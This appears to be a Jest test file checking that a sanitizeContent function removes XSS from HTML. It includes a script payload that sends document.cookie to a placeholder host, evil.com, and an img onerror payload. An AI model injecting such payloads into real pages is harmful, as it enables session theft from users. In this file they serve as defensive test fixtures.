import { sanitizeContent } from '@/lib/sanitize'

describe('Content page sanitization', () => {
  it('strips script tags that could appear in DB content', () => {
    const unsafe = '<p>Story</p><script>fetch("https://evil.com?c="+document.cookie)</script>'
    const safe = sanitizeContent(unsafe)
    expect(safe).not.toContain('<script>')
    expect(safe).toContain('<p>Story</p>')
  })
  it('strips img onerror XSS', () => {
    const unsafe = '<img src="x" onerror="alert(1)">'
    const safe = sanitizeContent(unsafe)
    expect(safe).not.toContain('onerror')
  })
})
